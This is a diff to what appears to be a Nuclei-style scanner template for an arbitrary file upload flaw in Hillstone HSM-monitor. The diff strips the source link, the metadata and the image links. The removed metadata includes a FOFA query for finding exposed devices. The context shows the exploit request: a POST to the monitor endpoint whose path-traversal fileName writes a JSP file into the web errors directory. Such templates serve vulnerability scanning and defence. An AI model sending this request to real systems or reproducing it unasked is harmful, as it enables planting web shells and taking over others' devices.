@@ -3,12 +3,8 @@ info:
   name: 山石网科HSM-monitor存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qg9bf3u4bf9p6o7x'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qg9bf3u4bf9p6o7x
-    fofa: body="login_hsm-all.css"
 http:
 - raw:
   - 'POST /ft//stoneos/monitor?sn=1&fileName=../../../../hsmprogram/service/application/WebDaemon/errors/2.jsp HTTP/1.1
@@ -31,7 +27,6 @@ http:
 
     ------WebKitFormBoundaryABC123--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711684954-13eeb937-0675-44f2-9af1-6bb80a1397d9.png)
 
     文件访问为原ip地址+端口'
   redirects: false
@@ -44,9 +39,7 @@ http:
 
     Host: {{Hostname}}
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711685144-8619d94a-c525-46f9-8827-d01cd8ba5bb8.png)'
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0'
   redirects: false
   matchers:
   - status:
